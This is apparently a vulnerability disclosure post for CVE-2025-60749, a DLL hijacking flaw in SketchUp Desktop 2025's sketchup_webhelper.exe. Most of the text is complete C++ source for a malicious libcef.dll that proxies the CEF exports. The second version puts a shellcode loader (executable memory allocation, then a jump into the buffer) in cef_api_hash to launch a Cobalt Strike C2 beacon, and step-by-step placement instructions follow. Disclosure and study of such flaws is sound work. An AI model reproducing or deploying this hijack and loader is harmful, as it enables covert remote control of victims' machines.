---
title: CVE-2025-60749
date: 2025-10-23 10:43:44
tags: cve申请

---

# SketchUp Desktop 2025 DLL Hijacking Vulnerability





**Vulnerable version download link: https://help.sketchup.com/zh-CN/downloading-sketchup**

![image-20251023102415453](https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510231024560.png)





**After downloading, locate the `sketchup_webhelper.exe` program in the software directory.**

![image-20251023102514393](https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510231025460.png)

**The program does not specify a full path when loading the `libcef.dll` DLL, causing Windows to search for the DLL according to a specific search order.**

**An attacker can place a malicious DLL file (e.g., `libcef.dll`) in a higher-priority location within the program's search path and implement an export function with the same name, thereby hijacking the program's execution flow.**



**For example:**

![image-20251023102645646](https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510231026686.png)



**When the program is executed, it will load this malicious DLL, and our demonstration pop-up window will be displayed.**

![image-20251023102731704](https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510231027803.png)





**Additionally, we can leverage this to deploy remote control tools such as Cobalt Strike.**



dllmain.cpp

```
// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
extern "C" __declspec(dllexport) int cef_string_multimap_free() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_string_multimap_alloc() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_string_multimap_append() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_string_multimap_value() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_string_multimap_key() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_string_multimap_size() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_string_map_append() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_string_map_value() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_string_utf16_clear() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_string_map_key() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_string_map_size() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_string_list_append() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_string_list_value() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_string_list_size() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_v8context_get_current_context() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_dictionary_value_create() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_string_map_alloc() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_string_map_free() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_v8value_create_function() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_v8value_create_object() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_v8value_create_string() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_v8value_create_double() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_v8value_create_int() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_v8value_create_bool() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_v8value_create_null() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_value_create() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_list_value_create() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_api_hash() {
    MessageBoxA(NULL, "dll导出函数劫持成功", 0, 0);
    return 0;
}
extern "C" __declspec(dllexport) int cef_do_message_loop_work() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_execute_process() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_post_task() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_string_list_free() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_string_list_alloc() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_process_message_create() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_string_userfree_utf16_free() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_cookie_manager_get_global_manager() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_log() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_string_utf16_cmp() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_string_utf8_clear() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_string_utf16_to_utf8() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_string_utf16_set() {
        return 0;
}
extern "C" __declspec(dllexport) int cef_string_utf8_to_utf16() {
        return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )

{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


```

**We only need to embed the malicious code within the following export function:**

```
extern "C" __declspec(dllexport) int cef_api_hash() {
    MessageBoxA(NULL, "dll导出函数劫持成功", 0, 0);
    return 0;
}

```



**Now, let's demonstrate the scenario of establishing a C2 connection.**



**ere is the simplest and most basic payload for C2 beaconing:**

![image-20251023103810726](https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510231038772.png)

```
// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
extern "C" __declspec(dllexport) int cef_string_multimap_free() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_string_multimap_alloc() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_string_multimap_append() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_string_multimap_value() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_string_multimap_key() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_string_multimap_size() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_string_map_append() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_string_map_value() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_string_utf16_clear() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_string_map_key() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_string_map_size() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_string_list_append() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_string_list_value() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_string_list_size() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_v8context_get_current_context() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_dictionary_value_create() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_string_map_alloc() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_string_map_free() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_v8value_create_function() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_v8value_create_object() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_v8value_create_string() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_v8value_create_double() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_v8value_create_int() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_v8value_create_bool() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_v8value_create_null() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_value_create() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_list_value_create() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_api_hash() {
    /* length: 894 bytes */
    unsigned char sc[] = "";


    // 分配内存空间
    LPVOID addr = VirtualAlloc(NULL, sizeof(sc), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (addr == NULL) {
        return 1;
    }

    // 将shellcode复制到可执行内存中
    memcpy(addr, sc, sizeof(sc));

    // 执行shellcode
    ((void(*)())addr)();

    return 0;
}
    
extern "C" __declspec(dllexport) int cef_do_message_loop_work() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_execute_process() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_post_task() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_string_list_free() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_string_list_alloc() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_process_message_create() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_string_userfree_utf16_free() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_cookie_manager_get_global_manager() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_log() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_string_utf16_cmp() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_string_utf8_clear() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_string_utf16_to_utf8() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_string_utf16_set() {
    return 0;
}
extern "C" __declspec(dllexport) int cef_string_utf8_to_utf16() {
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)

{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


```





**Place this (the malicious DLL) in the same directory as `sketchup_webhelper.exe` and rename it to `libcef.dll`.**

**Upon execution (of `sketchup_webhelper.exe`), the C2 connection will be established.**

![image-20251023104053230](https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510231040268.png)

![image-20251023104120937](https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510231041055.png)